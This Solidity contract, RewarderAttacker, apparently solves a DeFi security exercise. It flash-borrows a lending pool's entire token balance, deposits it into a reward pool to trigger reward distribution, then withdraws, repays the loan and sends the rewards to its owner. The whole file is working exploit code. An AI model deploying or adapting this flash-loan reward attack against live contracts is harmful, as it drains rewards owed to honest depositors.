// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import './TheRewarderPool.sol';
import './FlashLoanerPool.sol';

/**
 * @title RewarderAttacker
 * @author jb
 */
contract RewarderAttacker {
    address private _owner;
    TheRewarderPool private _target;
    ERC20 private _token;
    FlashLoanerPool private _pool;

    constructor() {
        _owner = msg.sender;
    }

    function attack(
        TheRewarderPool target,
        ERC20 token,
        FlashLoanerPool pool
    ) external {
        _attack(target, token, pool);
    }

    function _attack(
        TheRewarderPool target,
        ERC20 token,
        FlashLoanerPool pool
    ) internal {
        _target = target;
        _token = token;
        _pool = pool;

        uint256 tokenAmount = token.balanceOf(address(pool));
        pool.flashLoan(tokenAmount);
        ERC20 reward = _target.rewardToken();
        reward.transfer(_owner, reward.balanceOf(address(this)));
    }

    // receive the flash loan and perform the exploit
    function receiveFlashLoan(uint256 amount) external {
        _token.approve(address(_target), amount);
        _target.deposit(amount); // deposit automatically distributes rewards
        // _target.distributeRewards();
        _target.withdraw(amount);
        _token.transfer(address(_pool), amount);
    }

    receive() external payable {}
}
